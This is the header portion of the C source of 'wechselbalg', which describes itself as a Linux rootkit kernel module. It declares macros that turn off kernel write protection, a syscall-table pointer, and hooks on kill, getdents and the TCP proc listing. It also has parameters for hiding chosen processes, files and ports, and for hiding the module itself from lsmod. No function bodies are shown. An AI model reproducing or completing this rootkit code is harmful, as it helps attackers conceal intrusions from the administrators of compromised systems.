/*******************************************************************************
 *                ____                     _ __                                *
 *     ___  __ __/ / /__ ___ ______ ______(_) /___ __                          *
 *    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                          *
 *   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                           *
 *                                            /___/ team                       *
 *                                                                             *
 * wechselbalg.c                                                               *
 *                                                                             *
 * DATE                                                                        *
 * 10/26/2016                                                                  *
 *                                                                             *
 * AUTHOR                                                                      *
 * atzeton - http://www.nullsecurity.net/                                      *
 *                                                                             *
 * LICENSE                                                                     *
 * GPLv2                                                                       *
 *                                                                             *
 ******************************************************************************/
 
#define MAGIC_SIGNAL_NUM (12)

#define MODULE_NAME "wechselbalg: "

// disable/enable memeory write protection
#define DISABLE_WP write_cr0(read_cr0 () & ~0x10000)
#define ENABLE_WP  write_cr0(read_cr0 () |  0x10000);

#define IA32_LSTAR 0xc0000082

/*from net/ipv4/tcp_ipv4.c*/
#define TMPSZ 150

MODULE_AUTHOR("atzeton");
MODULE_DESCRIPTION("rootkit kernel module");
MODULE_LICENSE("GPL");

// the kernel's system call table
static void **sys_call_table;


struct linux_dirent {
	unsigned long   d_ino;
	unsigned long   d_off;
	unsigned short  d_reclen;
	char            d_name[1];
};

struct my_dir_context {
	filldir_t actor;
    loff_t pos;
};

struct proc_dir_entry {
	unsigned int low_ino;
	umode_t mode;
    nlink_t nlink;
    kuid_t uid;
    kgid_t gid;
    loff_t size;
    const struct inode_operations *proc_iops;
    const struct file_operations *proc_fops;
    struct proc_dir_entry *next, *parent, *subdir;
    void *data;
    atomic_t count; 
    atomic_t in_use;       
    struct completion *pde_unload_completion;
    struct list_head pde_openers;  
    spinlock_t pde_unload_lock; 
    u8 namelen;
    char name[];
};


#define PROCESS_NAME_LEN 50
#define FILE_NAME_LEN 50

static short hide = 0;
static short verbose = 1;
static char *hidden_procs;
static char *hidden_files;
static int hidden_ports[10];
static int hidden_ports_count = 0;


module_param_array(hidden_ports, int, &hidden_ports_count, 0000);
MODULE_PARM_DESC(hidden_ports, "An array of integers");


module_param(hide, short, 0000);
MODULE_PARM_DESC(hide, "Hide the module from lsmod");

module_param(verbose, short, 0000);
MODULE_PARM_DESC(verbose, "verbose output to dmesg");

module_param(hidden_procs, charp, 0000);
MODULE_PARM_DESC(hidden_procs, "Hidden process list");

module_param(hidden_files, charp, 0000);
MODULE_PARM_DESC(hidden_files, "Hidden file list");



struct hidden_process {
    char name[PROCESS_NAME_LEN];
    struct list_head list;
};

LIST_HEAD(hidden_procs_list);

struct hidden_file {
    char name[FILE_NAME_LEN];
    struct list_head list;
};

LIST_HEAD(hidden_file_list);



int (*tcp4_seq_show_actual)(struct seq_file*, void *);
static asmlinkage int (*signal_kill_actual)(pid_t pid, int sig) 												= NULL;

static asmlinkage int (*net_tcp4_seqops_show_actual)(struct seq_file*, void *) 									= NULL;

static asmlinkage int (*fs_getdents64_actual)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) = NULL;
static asmlinkage int (*fs_getdents_actual)(unsigned int fd, struct linux_dirent *dirp, unsigned int count) 	= NULL;


int get_pid_by_name(char *name);
void recheck_pids(void);

int port_is_to_be_hidden(char *seq_port);

static int net_tcp4_seqops_show_new(struct seq_file *seq, void *v);

static int fs_getdents64_new(unsigned int fd, struct linux_dirent64 __user *dirp_userspace, unsigned int count);
static int fs_getdents_new(unsigned int fd, struct linux_dirent __user *dirp_userspace, unsigned int count);

int pid_is_to_be_hidden(pid_t pid);
